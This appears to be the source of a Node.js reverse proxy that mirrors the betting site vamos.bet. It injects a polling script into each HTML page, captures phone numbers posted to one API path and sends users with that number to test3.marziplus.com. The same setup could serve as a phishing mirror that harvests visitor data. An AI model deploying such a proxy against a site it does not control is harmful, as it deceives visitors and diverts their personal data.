import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

// Your upstream website
const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;

// Trigger API
const REDIRECT_API_PATH = "/api/v9/test/redirect";

// Destination
const REDIRECT_BASE_URL = "https://test3.marziplus.com";

// How long redirect state remains alive
const REDIRECT_TTL_MS = 60_000;

// Maximum API body we will buffer
const MAX_BODY_SIZE = 1 * 1024 * 1024; // 1 MB

// Upstream timeout
const UPSTREAM_TIMEOUT_MS = 30_000;

// Client timeout
const CLIENT_TIMEOUT_MS = 120_000;

/*
|--------------------------------------------------------------------------
| HTTPS AGENT
|--------------------------------------------------------------------------
|
| Keep connections alive instead of creating a brand-new TLS connection
| to marziplus.com for every request.
|
*/

const upstreamAgent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 1_000,
  maxSockets: 200,
  maxFreeSockets: 50,
  timeout: 60_000
});

/*
|--------------------------------------------------------------------------
| CLIENT SESSION STATE
|--------------------------------------------------------------------------
*/

const clients = new Map();

function createClientId() {
  return crypto.randomUUID();
}

function getClientId(req) {
  const cookieHeader = req.headers.cookie || "";

  const match = cookieHeader.match(
    /(?:^|;\s*)proxy_client_id=([^;]+)/
  );

  return match ? match[1] : null;
}

function getOrCreateClient(req, res) {
  let id = getClientId(req);

  if (!id) {
    id = createClientId();

    res.setHeader(
      "Set-Cookie",
      `proxy_client_id=${id}; Path=/; HttpOnly; SameSite=Lax`
    );
  }

  let state = clients.get(id);

  if (!state) {
    state = {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now(),
      lastSeen: Date.now()
    };

    clients.set(id, state);
  } else {
    state.lastSeen = Date.now();
  }

  return id;
}

/*
|--------------------------------------------------------------------------
| CLEAN EXPIRED CLIENT STATE
|--------------------------------------------------------------------------
*/

const cleanupTimer = setInterval(() => {
  const now = Date.now();

  for (const [id, state] of clients.entries()) {
    if (
      now - state.lastSeen >
      REDIRECT_TTL_MS
    ) {
      clients.delete(id);
    }
  }
}, 15_000);

cleanupTimer.unref();

/*
|--------------------------------------------------------------------------
| REDACT SENSITIVE JSON FIELDS
|--------------------------------------------------------------------------
*/

function redactSensitiveData(value) {
  if (!value || typeof value !== "object") {
    return value;
  }

  if (Array.isArray(value)) {
    return value.map(redactSensitiveData);
  }

  const result = {};

  for (const [key, val] of Object.entries(value)) {
    const lower = key.toLowerCase();

    if (
      lower.includes("password") ||
      lower.includes("passwd") ||
      lower.includes("token") ||
      lower.includes("secret") ||
      lower.includes("authorization") ||
      lower.includes("access_token") ||
      lower.includes("refresh_token") ||
      lower.includes("session")
    ) {
      result[key] = "[REDACTED]";
    } else if (
      val &&
      typeof val === "object"
    ) {
      result[key] =
        redactSensitiveData(val);
    } else {
      result[key] = val;
    }
  }

  return result;
}

/*
|--------------------------------------------------------------------------
| HOP-BY-HOP HEADERS
|--------------------------------------------------------------------------
*/

function removeHopByHopHeaders(headers) {
  const result = { ...headers };

  const connection = result.connection;

  if (connection) {
    const connectionHeaders =
      connection
        .split(",")
        .map(v => v.trim().toLowerCase());

    for (const header of connectionHeaders) {
      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;

  return result;
}

/*
|--------------------------------------------------------------------------
| MERGE SET-COOKIE
|--------------------------------------------------------------------------
*/

function mergeSetCookie(
  responseHeaders,
  proxyCookie
) {
  const headers = {
    ...responseHeaders
  };

  const existing = headers["set-cookie"];

  if (!existing) {
    headers["set-cookie"] = [proxyCookie];
    return headers;
  }

  if (Array.isArray(existing)) {
    headers["set-cookie"] = [
      ...existing,
      proxyCookie
    ];

    return headers;
  }

  headers["set-cookie"] = [
    existing,
    proxyCookie
  ];

  return headers;
}

/*
|--------------------------------------------------------------------------
| BUILD UPSTREAM HEADERS
|--------------------------------------------------------------------------
*/

function buildUpstreamHeaders(clientReq) {
  const headers = {
    ...clientReq.headers,

    host: TARGET_HOSTNAME,

    /*
     * HTML is modified by the proxy, so don't allow
     * gzip/Brotli for upstream responses.
     */
    "accept-encoding": "identity"
  };

  delete headers.connection;

  /*
   * We'll let Node calculate the body size for
   * buffered requests.
   */
  delete headers["content-length"];

  return headers;
}

/*
|--------------------------------------------------------------------------
| BROWSER REDIRECT WATCHER
|--------------------------------------------------------------------------
*/

function injectWatcher(html) {
  const script = `
<script>
(function () {
  const interval = setInterval(async function () {

    try {
      const response = await fetch(
        "/__proxy_redirect_status",
        {
          method: "GET",
          cache: "no-store",
          credentials: "same-origin"
        }
      );

      if (!response.ok) {
        return;
      }

      const data = await response.json();

      if (data.redirect && data.url) {
        clearInterval(interval);
        window.location.replace(data.url);
      }

    } catch (error) {
      // Ignore temporary proxy errors.
    }

  }, 700);

})();
</script>
`;

  if (html.includes("</body>")) {
    return html.replace(
      "</body>",
      `${script}</body>`
    );
  }

  return html + script;
}

/*
|--------------------------------------------------------------------------
| HANDLE HTML RESPONSE
|--------------------------------------------------------------------------
*/

function handleHtmlResponse(
  upstreamRes,
  clientRes,
  proxyCookie
) {
  const chunks = [];

  let totalSize = 0;

  upstreamRes.on("data", chunk => {
    totalSize += chunk.length;

    /*
     * Prevent unexpectedly huge HTML from consuming
     * unlimited memory.
     */
    if (totalSize <= 15 * 1024 * 1024) {
      chunks.push(chunk);
    }
  });

  upstreamRes.on("end", () => {
    try {
      if (totalSize > 15 * 1024 * 1024) {
        clientRes.writeHead(502, {
          "Content-Type":
            "text/plain; charset=utf-8"
        });

        clientRes.end(
          "HTML response too large"
        );

        return;
      }

      let body = Buffer.concat(chunks);

      let html =
        body.toString("utf8");

      html = injectWatcher(html);

      body = Buffer.from(
        html,
        "utf8"
      );

      let headers =
        removeHopByHopHeaders(
          upstreamRes.headers
        );

      /*
       * Body changed.
       */
      delete headers["content-length"];
      delete headers["content-encoding"];

      headers["content-length"] =
        body.length;

      /*
       * Preserve both upstream cookies and
       * the proxy session cookie.
       */
      headers =
        mergeSetCookie(
          headers,
          proxyCookie
        );

      clientRes.writeHead(
        upstreamRes.statusCode || 200,
        headers
      );

      clientRes.end(body);

    } catch (error) {
      console.error(
        "HTML processing error:",
        error.message
      );

      if (!clientRes.headersSent) {
        clientRes.writeHead(502);
      }

      clientRes.end(
        "Bad Gateway"
      );
    }
  });

  upstreamRes.on("error", error => {
    console.error(
      "HTML upstream response error:",
      error.message
    );

    if (!clientRes.headersSent) {
      clientRes.writeHead(502);
    }

    clientRes.end(
      "Bad Gateway"
    );
  });
}

/*
|--------------------------------------------------------------------------
| NORMAL UPSTREAM RESPONSE
|--------------------------------------------------------------------------
*/

function handleNormalResponse(
  upstreamRes,
  clientRes,
  proxyCookie
) {
  let headers =
    removeHopByHopHeaders(
      upstreamRes.headers
    );

  headers =
    mergeSetCookie(
      headers,
      proxyCookie
    );

  if (!clientRes.headersSent) {
    clientRes.writeHead(
      upstreamRes.statusCode || 200,
      headers
    );
  }

  upstreamRes.pipe(clientRes);
}

/*
|--------------------------------------------------------------------------
| FORWARD REQUEST
|--------------------------------------------------------------------------
*/

function forwardRequest(
  clientReq,
  clientRes,
  bufferedBody = null,
  clientId = null
) {
  const headers =
    buildUpstreamHeaders(clientReq);

  /*
   * Make sure Host is correct.
   */
  headers.host =
    TARGET_HOSTNAME;

  /*
   * Buffered request body.
   */
  if (Buffer.isBuffer(bufferedBody)) {
    headers["content-length"] =
      bufferedBody.length;
  }

  const options = {
    hostname: TARGET_HOSTNAME,
    port: TARGET_PORT,

    method: clientReq.method,

    path: clientReq.url,

    headers,

    agent: upstreamAgent,

    servername: TARGET_HOSTNAME,

    rejectUnauthorized: true
  };

  console.log(
    `→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`
  );

  const upstreamReq =
    https.request(
      options,
      upstreamRes => {
        console.log(
          `← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`
        );

        const contentType =
          upstreamRes.headers[
            "content-type"
          ] || "";

        /*
         * Build proxy session cookie.
         */
        let proxyCookie = null;

        if (clientId) {
          proxyCookie =
            `proxy_client_id=${clientId}; Path=/; HttpOnly; SameSite=Lax`;
        }

        /*
         * HTML must be buffered because we inject
         * the watcher.
         */
        if (
          contentType
            .toLowerCase()
            .includes("text/html")
        ) {
          handleHtmlResponse(
            upstreamRes,
            clientRes,
            proxyCookie
          );

          return;
        }

        /*
         * Everything else streams.
         */
        handleNormalResponse(
          upstreamRes,
          clientRes,
          proxyCookie
        );
      }
    );

  /*
   * Explicit upstream timeout.
   */
  upstreamReq.setTimeout(
    UPSTREAM_TIMEOUT_MS,
    () => {
      console.error(
        `❌ Upstream timeout after ${UPSTREAM_TIMEOUT_MS}ms`
      );

      upstreamReq.destroy(
        new Error("Upstream timeout")
      );
    }
  );

  upstreamReq.on(
    "error",
    error => {
      console.error(
        "❌ Upstream error:",
        error.message
      );

      if (!clientRes.headersSent) {
        clientRes.writeHead(502, {
          "Content-Type":
            "text/plain; charset=utf-8",
          "Cache-Control":
            "no-store"
        });

        clientRes.end(
          "Bad Gateway"
        );

        return;
      }

      /*
       * Headers were already sent.
       */
      clientRes.destroy();
    }
  );

  /*
   * Buffered request.
   */
  if (
    Buffer.isBuffer(bufferedBody)
  ) {
    upstreamReq.end(
      bufferedBody
    );

    return;
  }

  /*
   * Normal streaming request.
   */
  clientReq.pipe(
    upstreamReq
  );
}

/*
|--------------------------------------------------------------------------
| REDIRECT STATUS
|--------------------------------------------------------------------------
*/

function handleRedirectStatus(
  state,
  clientRes
) {
  const response =
    JSON.stringify({
      redirect: Boolean(
        state?.redirected
      ),

      url:
        state?.redirectUrl || null
    });

  clientRes.writeHead(
    200,
    {
      "Content-Type":
        "application/json; charset=utf-8",

      "Cache-Control":
        "no-store, no-cache, must-revalidate",

      "Content-Length":
        Buffer.byteLength(response)
    }
  );

  clientRes.end(response);
}

/*
|--------------------------------------------------------------------------
| REDIRECT REQUEST
|--------------------------------------------------------------------------
*/

async function handleRedirectRequest(
  clientReq,
  clientRes,
  state,
  clientId
) {
  const chunks = [];

  let totalSize = 0;

  try {
    for await (
      const chunk of clientReq
    ) {
      totalSize += chunk.length;

      if (
        totalSize >
        MAX_BODY_SIZE
      ) {
        clientRes.writeHead(
          413,
          {
            "Content-Type":
              "text/plain; charset=utf-8"
          }
        );

        clientRes.end(
          "Request body too large"
        );

        return;
      }

      chunks.push(chunk);
    }
  } catch (error) {
    console.error(
      "Request body error:",
      error.message
    );

    clientRes.writeHead(400);

    clientRes.end(
      "Bad Request"
    );

    return;
  }

  const body =
    Buffer.concat(chunks);

  /*
   * ========================================
   * NO BODY
   * ========================================
   */

  if (body.length === 0) {
    console.log(
      "↪ Redirect endpoint has no body"
    );

    console.log(
      "↪ Continuing normal proxy..."
    );

    forwardRequest(
      clientReq,
      clientRes,
      body,
      clientId
    );

    return;
  }

  console.log("");
  console.log(
    "=========================================="
  );

  console.log(
    "REDIRECT ENDPOINT"
  );

  console.log(
    `Body size: ${body.length} bytes`
  );

  let json;

  try {
    json = JSON.parse(
      body.toString("utf8")
    );
  } catch (error) {
    console.log(
      "Invalid JSON."
    );

    console.log(
      "↪ Continuing normal proxy..."
    );

    console.log(
      "=========================================="
    );

    forwardRequest(
      clientReq,
      clientRes,
      body,
      clientId
    );

    return;
  }

  /*
   * Only accept an object.
   */
  if (
    !json ||
    typeof json !== "object" ||
    Array.isArray(json)
  ) {
    console.log(
      "Body is not a JSON object."
    );

    console.log(
      "↪ Continuing normal proxy..."
    );

    console.log(
      "=========================================="
    );

    forwardRequest(
      clientReq,
      clientRes,
      body,
      clientId
    );

    return;
  }

  /*
   * Log safely.
   */
  console.log(
    "Request body:"
  );

  console.log(
    JSON.stringify(
      redactSensitiveData(json),
      null,
      2
    )
  );

  /*
   * ========================================
   * PHONE
   * ========================================
   */

  const phone =
    json.phone;

  /*
   * No phone -> normal proxy.
   */
  if (
    phone === undefined ||
    phone === null ||
    String(phone).trim() === ""
  ) {
    console.log(
      "⚠️ No phone field."
    );

    console.log(
      "↪ Continuing normal proxy..."
    );

    console.log(
      "=========================================="
    );

    forwardRequest(
      clientReq,
      clientRes,
      body,
      clientId
    );

    return;
  }

  /*
   * ========================================
   * BUILD REDIRECT
   * ========================================
   */

  const redirectUrl =
    new URL(
      REDIRECT_BASE_URL
    );

  redirectUrl.searchParams.set(
    "phone",
    String(phone)
  );

  const finalUrl =
    redirectUrl.toString();

  console.log(
    `📱 Phone: ${String(phone)}`
  );

  console.log(
    `➡ Redirect URL: ${finalUrl}`
  );

  /*
   * ========================================
   * MARK CLIENT
   * ========================================
   */

  if (state) {
    state.redirected = true;
    state.redirectUrl = finalUrl;
    state.lastSeen = Date.now();
  }

  /*
   * ========================================
   * DO NOT FORWARD API
   * ========================================
   */

  const response =
    JSON.stringify({
      success: true,
      proxyRedirect: true
    });

  clientRes.writeHead(
    200,
    {
      "Content-Type":
        "application/json; charset=utf-8",

      "Cache-Control":
        "no-store, no-cache, must-revalidate",

      "Content-Length":
        Buffer.byteLength(response)
    }
  );

  clientRes.end(
    response
  );

  console.log(
    "🛑 Redirect state activated."
  );

  console.log(
    "=========================================="
  );
}

/*
|--------------------------------------------------------------------------
| MAIN SERVER
|--------------------------------------------------------------------------
*/

const server =
  http.createServer(
    async (clientReq, clientRes) => {

      /*
       * Protect individual client connections
       * from hanging forever.
       */
      clientReq.setTimeout(
        CLIENT_TIMEOUT_MS,
        () => {
          console.error(
            "❌ Client request timeout"
          );

          clientReq.destroy();
        }
      );

      try {
        const parsedUrl =
          new URL(
            clientReq.url,
            `http://${clientReq.headers.host || "localhost"}`
          );

        const path =
          parsedUrl.pathname;

        /*
         * Get/create proxy session.
         */
        const clientId =
          getOrCreateClient(
            clientReq,
            clientRes
          );

        const state =
          clients.get(clientId);

        console.log(
          `→ ${clientReq.method} ${clientReq.url}`
        );

        /*
         * ======================================
         * REDIRECT STATUS
         * ======================================
         */

        if (
          clientReq.method === "GET" &&
          path ===
            "/__proxy_redirect_status"
        ) {
          handleRedirectStatus(
            state,
            clientRes
          );

          return;
        }

        /*
         * ======================================
         * REDIRECT TRIGGER
         * ======================================
         */

        if (
          path ===
          REDIRECT_API_PATH
        ) {
          await handleRedirectRequest(
            clientReq,
            clientRes,
            state,
            clientId
          );

          return;
        }

        /*
         * ======================================
         * STOP REDIRECTED SESSION
         * ======================================
         */

        if (
          state &&
          state.redirected
        ) {
          console.log(
            `🛑 Proxy session terminated: ${path}`
          );

          clientRes.writeHead(
            410,
            {
              "Content-Type":
                "text/plain; charset=utf-8",

              "Cache-Control":
                "no-store"
            }
          );

          clientRes.end(
            "Proxy session terminated"
          );

          return;
        }

        /*
         * ======================================
         * NORMAL PROXY
         * ======================================
         */

        forwardRequest(
          clientReq,
          clientRes,
          null,
          clientId
        );

      } catch (error) {
        console.error(
          "❌ Request handler error:",
          error
        );

        if (
          !clientRes.headersSent
        ) {
          clientRes.writeHead(
            500,
            {
              "Content-Type":
                "text/plain; charset=utf-8"
            }
          );
        }

        clientRes.end(
          "Internal Server Error"
        );
      }
    }
  );

/*
|--------------------------------------------------------------------------
| NODE SERVER TIMEOUT SETTINGS
|--------------------------------------------------------------------------
|
| Keep these comfortably above the Nginx values.
|
*/

server.requestTimeout =
  CLIENT_TIMEOUT_MS;

server.headersTimeout =
  65_000;

server.keepAliveTimeout =
  65_000;

server.maxRequestsPerSocket = 0;

/*
|--------------------------------------------------------------------------
| SERVER ERRORS
|--------------------------------------------------------------------------
*/

server.on(
  "clientError",
  (error, socket) => {
    console.error(
      "❌ Client error:",
      error.message
    );

    if (
      socket.writable
    ) {
      socket.end(
        "HTTP/1.1 400 Bad Request\r\n\r\n"
      );
    }
  }
);

/*
|--------------------------------------------------------------------------
| PROCESS ERROR HANDLERS
|--------------------------------------------------------------------------
|
| Log unexpected errors. PM2 should restart the application
| if the process actually exits.
|
*/

process.on(
  "uncaughtException",
  error => {
    console.error(
      "❌ uncaughtException:",
      error
    );
  }
);

process.on(
  "unhandledRejection",
  error => {
    console.error(
      "❌ unhandledRejection:",
      error
    );
  }
);

/*
|--------------------------------------------------------------------------
| START
|--------------------------------------------------------------------------
*/

server.listen(
  PROXY_PORT,
  PROXY_HOST,
  () => {
    console.log("");
    console.log(
      "=========================================="
    );

    console.log(
      " MarziPlus Reverse Proxy"
    );

    console.log(
      "=========================================="
    );

    console.log(
      `Listening:  http://${PROXY_HOST}:${PROXY_PORT}`
    );

    console.log(
      `Upstream:   https://${TARGET_HOSTNAME}`
    );

    console.log(
      `Trigger:    ${REDIRECT_API_PATH}`
    );

    console.log(
      `Redirect:   ${REDIRECT_BASE_URL}?phone=...`
    );

    console.log(
      "=========================================="
    );

    console.log("");
  }
);